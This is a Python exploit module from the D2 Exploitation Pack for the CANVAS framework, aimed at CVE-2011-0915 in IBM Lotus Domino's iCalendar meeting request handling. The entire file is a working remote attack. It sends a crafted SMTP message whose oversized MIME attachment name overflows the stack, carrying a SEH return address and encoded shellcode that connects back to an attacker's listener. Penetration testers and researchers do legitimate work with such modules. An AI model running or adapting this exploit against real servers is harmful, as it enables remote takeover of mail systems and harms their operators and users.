#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#


import sys

if "." not in sys.path: 
	sys.path.append(".")

import struct
import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from shellcode import shellcodeGenerator
from encoder import alphanumeric

# GUI info
NAME = "IBM Lotus Domino iCalendar Meeting Request Stack Overflow Vulnerability"

DESCRIPTION = "Stack Overflow Vulnerability in IBM Lotus Domino iCalendar Meeting Request"

DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = "IBM"
DOCUMENTATION["Repeatability"] = "One"
DOCUMENTATION["Date public"] = "2011.02.07"
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-11-048/"
DOCUMENTATION["Versions Affected"] = "Lotus Domino Server < 8.5.3"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2011-0915"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0915"
DOCUMENTATION["Notes"] = ""

VERSION = "1.0"

GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003" ]

NOTES="""
"""

CHANGELOG="""
"""

targets = {    
    0 : [ "Lotus Domino Server 8.0.2", 0x60453743 ], # pop, pop, ret @ nnotes.dll
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name = NAME      
        self.email = "" 
        self.port = 25        
        self.version = 0
        self.badstring = "\0"
        return


    def neededListenerTypes(self):
        from canvasengine import WIN32MOSDEF
        return [WIN32MOSDEF]    


    def createShellcode(self):
        if self.callback:
        	host = self.callback.ip
        	port = self.callback.port       
      	      	      
        self.shellcode = self.createHeapSafeInject(self.badstring, host, port)

        encoder         = alphanumeric.AlphaNum()
        totopc          = encoder.seh_pc()
        getpc           = encoder.get_pc(reg='ecx')
        
        payload         = encoder.encode(self.shellcode)
        self.shellcode  = totopc + getpc + payload                   
        
        
    def run(self):
        # Check arguments
        self.host = self.target.interface                
        self.port = int(self.argsDict.get("port", self.port))
        self.email = self.argsDict.get("email", self.email)
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
        self.log("Version %d "%(self.version))     
        self.log("Attacking %s:%d"%(self.host, self.port))
        
        sploitstring = self.makesploit()
                
        s = self.gettcpsock()
        s.connect((self.host, self.port))
        
        s.recv(1024)
        data = "HELO D2\r\n"
        s.send(data)
        s.recv(1024)
        
        data = "MAIL FROM: d2@d2sec.com\r\n"
        s.send(data)
        s.recv(1024)
        
        data = "RCPT TO: " + self.email + "\r\n"
        s.send(data)
        s.recv(1024)
        
        data = "DATA\r\n"
        s.send(data)
        s.recv(1024)
        
        s.send(sploitstring + "\r\n.\r\n")
        s.recv(1024)
        
        data = "QUIT\r\n"
        s.send(data)
        s.recv(1024)
        s.send(sploitstring)        

        ret = self.ISucceeded()
        
        if not ret:
        	self.log("Sleeping for two seconds to check for callback")
        	time.sleep(2)
        	ret = self.ISucceeded()        

        if ret:
        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
        	self.log("%s done (succeeded!)" % self.name)            
        
        return ret
        
        
    def makesploit(self):				
    	os_name, eip = targets[self.version]
    	ret = struct.pack('<L', eip)    	
        
        buff = ("\x60" * 2365) + ret + self.shellcode + "\x60" * (30628 - len(self.shellcode))
        
        
        data = """Content-class: urn:content-classes:calendarmessage
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="----_=_NextPart_001_01CBCAFD.5FBD2133"
Subject: D2
From: "DSquare Security" <d2@d2sec.com>


This is a multi-part message in MIME format.

------_=_NextPart_001_01CBCAFD.5FBD2133
Content-Type: multipart/alternative;
	boundary="----_=_NextPart_002_01CBCAFD.5FBD2133"


------_=_NextPart_002_01CBCAFD.5FBD2133
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: base64

D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2

------_=_NextPart_002_01CBCAFD.5FBD2133
Content-Type: text/html;
	charset="utf-8"
Content-Transfer-Encoding: base64

D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2

------_=_NextPart_002_01CBCAFD.5FBD2133
Content-class: urn:content-classes:calendarmessage
Content-Type: text/calendar;
	method=REQUEST;
	name="d2.ics"
Content-Transfer-Encoding: 8bit

BEGIN:VCALENDAR
METHOD:REQUEST
PRODID:Microsoft CDO for Microsoft Exchange
VERSION:2.0
BEGIN:VTIMEZONE
X-MICROSOFT-CDO-TZID:3
BEGIN:STANDARD
DTSTART:16010101T030000
TZOFFSETFROM:+0200
TZOFFSETTO:+0100
RRULE:FREQ=YEARLY;WKST=MO;INTERVAL=1;BYMONTH=10;BYDAY=-1SU
END:STANDARD
BEGIN:DAYLIGHT
DTSTART:16010101T020000
TZOFFSETFROM:+0100
TZOFFSETTO:+0200
RRULE:FREQ=YEARLY;WKST=MO;INTERVAL=1;BYMONTH=3;BYDAY=-1SU
END:DAYLIGHT
END:VTIMEZONE
BEGIN:VEVENT
DTSTAMP:20110212T213949Z
DTSTART;TZID="":20110212T220000
SUMMARY:D2
UID:{F08E485F-115D-4F7B-BC51-25BA207D3EDB}
ORGANIZER;CN="D2":MAILTO:d2@d2sec.com
LOCATION:
DTEND;TZID="":20110212T223000
DESCRIPTION:\N
SEQUENCE:2
PRIORITY:5
CLASS:
CREATED:20110212T213927Z
LAST-MODIFIED:20110212T213949Z
STATUS:CONFIRMED
TRANSP:OPAQUE
X-MICROSOFT-CDO-BUSYSTATUS:BUSY
X-MICROSOFT-CDO-INSTTYPE:0
X-MICROSOFT-CDO-INTENDEDSTATUS:BUSY
X-MICROSOFT-CDO-ALLDAYEVENT:FALSE
X-MICROSOFT-CDO-IMPORTANCE:1
ATTACH:CID:051901cbcafd$5fdc1fb8$_CDOEX
X-MICROSOFT-CDO-OWNERAPPTID:-1
X-MICROSOFT-CDO-APPT-SEQUENCE:2
BEGIN:VALARM
ACTION:DISPLAY
DESCRIPTION:REMINDER
TRIGGER;RELATED=START:-PT00H15M00S
END:VALARM
END:VEVENT
END:VCALENDAR

------_=_NextPart_002_01CBCAFD.5FBD2133--

------_=_NextPart_001_01CBCAFD.5FBD2133
Content-Type: image/pjpeg;
	name="MAILTOOVERFLOW"
Content-Transfer-Encoding: base64
Content-ID: <051901cbcafd$5fdc1fb8$_CDOEX>
Content-Description: d2.jpg
Content-Disposition: attachment;
	filename="d2.jpg"

D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2


------_=_NextPart_001_01CBCAFD.5FBD2133--
        """

        sploitstring = data.replace("MAILTOOVERFLOW", "%s" % buff)			
	
    	return sploitstring
      
        		
    def displayVersions(self):
    	i = 0
    	print 'Available versions:'
    	for listline in targets.values():
    		print "\t%d: %s" % (i,listline[0])
    		i += 1


    def usage(self):
    	print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
    	self.displayVersions()
    	sys.exit(0)


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
